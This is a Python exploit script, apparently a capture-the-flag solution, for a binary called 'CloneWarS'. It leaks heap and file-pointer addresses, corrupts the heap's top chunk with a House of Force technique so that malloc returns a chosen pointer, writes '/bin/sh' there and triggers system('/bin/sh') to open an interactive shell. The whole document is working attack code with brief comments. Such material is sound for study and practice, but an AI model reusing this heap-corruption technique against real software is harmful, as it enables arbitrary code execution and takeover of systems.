from roppy import *

p = process("./CloneWarS")
context.log_level = "info"
def prepstarships(amount, ship_type, capacity):
    p.sendlineafter(": ", "3")
    p.sendlineafter(": ", str(amount))
    p.sendlineafter(": ", ship_type)
    p.sendlineafter(": ", str(capacity))


def r2d2():
	p.sendlineafter(": ", "2")
	p.sendlineafter("? ", "x")
	p.recvline()
	leak = p.recvline().split()[3]
	return int(leak)

def darkside():
	p.sendlineafter(": ", "6")
	p.recvline()
	leak = p.recvline().split(b": ")[1]
	return int(leak)

def build_deathstar(amount):
    p.sendlineafter(": ", "1")
    p.sendlineafter(": ", str(amount))

def maketroopers(amount, data):
	p.sendlineafter(": ", "4")
	p.sendlineafter(": ", str(amount))
	p.sendlineafter(": ", data)


# Prepare a starship, hence allocating a chunk

prepstarships(0x24, 'A'*0x24, 0x24)
# Leak hea
heap = r2d2()
log.info("HEAP:     %s" %(hex(heap)))
fptr = darkside()
log.info("FILE ptr: %s" %(hex(fptr)))

# Overwriting the top chunk with `0xfffffffffff` making it large enough

prepstarships(0x24, "FF", 0x40)

# Calculating the TOP_CHUNK address which will be subtracted from the fptr and then can
# be used with House Of Force
TOP_CHUNK = (heap) #- 0x1380)
TOP_CHUNK -= 0xd0   # Wilderness Offset
TOP_CHUNK += 8 * 4            # This will exact return the 24 bytes, by default `malloc` returns 24 for value given > 24
log.info("TOP CHUNK: 0x%x" %(TOP_CHUNK))

build_deathstar(fptr - TOP_CHUNK) # Subtracting and sending the offset, hence forcing the heap

# malloc will return the fptr, which when we send /bin/sh will get overwritten
# that will result in being `system(fptr)`, ptr being the /bin/sh

p.sendlineafter(": ", "4")
p.sendlineafter(":", "/bin/sh")
# Trigger system("/bin/sh")
p.sendlineafter(": ", "6")

p.interactive()
